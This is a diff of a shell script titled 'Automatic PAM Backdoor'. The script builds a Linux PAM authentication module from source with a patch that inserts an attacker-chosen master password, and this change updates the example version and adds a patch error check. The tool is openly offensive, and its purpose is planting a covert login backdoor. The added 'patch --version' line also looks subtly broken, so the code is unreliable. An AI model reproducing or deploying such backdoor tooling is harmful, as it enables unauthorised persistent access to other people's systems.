@@ -10,7 +10,7 @@ echo "Automatic PAM Backdoor"
 
 function show_help {
 	echo ""
-	echo "Example usage: $0 -v 1.3.0 -p some_s3cr3t_p455word"
+	echo "Example usage: $0 -v 1.5.0 -p some_s3cr3t_p455word"
 	echo "For a list of supported versions: https://github.com/linux-pam/linux-pam/releases"
 }
 
@@ -73,7 +73,12 @@ if [[ $? -ne 0 ]]; then # did not work, trying the old format
 fi
 
 tar xzf $PAM_FILE
-cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch -p1 -d $PAM_DIR
+cat backdoor.patch | sed -e "s/_PASSWORD_/${PASSWORD}/g" | patch --version -p1 -d $PAM_DIR
+if [[ $? -ne 0 ]]; then
+    echo ""
+    echo "[!] Patch error, Exiting.."
+    exit 2
+fi
 cd $PAM_DIR
 # newer version need autogen to generate the configure script
 if [[ ! -f "./configure" ]]; then 
